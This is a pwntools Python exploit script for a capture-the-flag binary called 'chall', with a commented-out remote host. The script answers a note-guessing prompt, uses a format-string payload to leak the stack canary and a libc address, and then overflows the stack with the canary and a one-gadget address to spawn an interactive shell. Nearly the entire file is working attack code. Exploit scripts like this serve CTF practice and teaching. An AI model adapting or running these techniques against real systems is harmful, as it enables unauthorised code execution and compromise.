#!/usr/bin/env python3
from pwn import *

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
#HOST = ''
#PORT = 

binf = ELF(bin_file)
libc = ELF('./libc.so.6')

notes = ['D', 'B', 'A', 'G', 'D']

def choose_notes(io, i):
    io.recvuntil('note:')
    io.recvline()
    io.recv(3)
    if notes[i] == io.recv(1).decode():
        io.sendlineafter('> ', '1')
    else:
        io.sendlineafter('> ', '2')    

def attack(io, **kwargs):
    for i in range(5):
        choose_notes(io, i)

    fsa = '%41$p_%43$p'
    io.sendlineafter('> ', fsa)
    io.recvuntil('0x')
    canary = int(io.recv(16), 16)
    io.recv(3)
    leak = int(io.recv(12), 16)
    
    libc.address = leak - 231 - libc.sym.__libc_start_main
    info('libc_base is 0x{:08x}'.format(libc.address))

    onegad = [0x4f3d5, 0x4f432, 0x10a41c]
    addr_onegad = libc.address + onegad[1]

    exploit = b'a' * 0x28
    exploit += p64(canary)
    exploit += b'a' * 0x38
    exploit += p64(addr_onegad)
    
    io.recvuntil('like')
    io.sendafter(': ', exploit)

def main():
    io = process(bin_file)
    #io = remote(HOST, PORT)
    attack(io)
    #gdb.attach(io, '')
    io.interactive()

if __name__ == '__main__':
    main()
